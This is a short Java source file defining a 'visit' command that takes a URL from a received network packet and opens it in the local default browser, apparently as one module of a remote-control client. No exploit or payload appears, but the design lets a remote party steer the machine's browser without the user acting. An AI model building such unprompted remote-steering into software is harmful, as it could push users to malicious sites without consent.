package casper.client.commands.impl;

import casper.client.Client;
import casper.client.commands.Action;
import casper.client.commands.Command;
import casper.net.Packet;
import casper.net.json.JSONArray;
import casper.net.json.JSONException;

import java.awt.*;
import java.net.URI;

/**
 * A command to open a website in the client's default browser.
 *
 * @author Aazim
 * @version 1.0
 */
@Command("visit")
public class Visit implements Action {

    public void execute(Client client, Packet p) throws JSONException {


        JSONArray params = p.readJSONArray();
        Desktop desktop = Desktop.getDesktop();

        try {

            String url = params.getString(0);
            URI uri = new URI(url);

            desktop.browse(uri);

        } catch (Exception ignored) {
        }

    }

}
